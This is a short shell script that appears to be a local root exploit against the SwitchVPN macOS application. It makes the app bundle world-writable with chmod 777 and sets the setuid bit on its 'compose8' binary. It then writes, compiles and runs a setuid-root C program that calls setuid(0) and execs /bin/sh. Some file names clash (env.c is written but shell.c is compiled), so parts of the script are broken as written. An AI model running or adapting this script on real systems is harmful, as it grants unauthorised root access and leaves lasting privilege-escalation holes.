#!/bin/sh

chown -R root /Applications/SwitchVPN/SwitchVPN.app/
chgrp -R admin /Applications/SwitchVPN/SwitchVPN.app/
chmod -R 777 /Applications/SwitchVPN/SwitchVPN.app/
chmod -R u+s /Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS/compose8

chown root /tmp/shell
chmod 4755 /tmp/shell

cat > env.c << _EOF
#include <stdlib.h>
#include <unistd.h>
main () {
  setuid(0);
  seteuid(0);
  setgid(0);
  execve("/bin/sh", 0, 0);
}
_EOF

gcc shell.c -o shell
chown root /tmp/shell
chmod 4755 /tmp/shell
/tmp/shell
./tmp/shell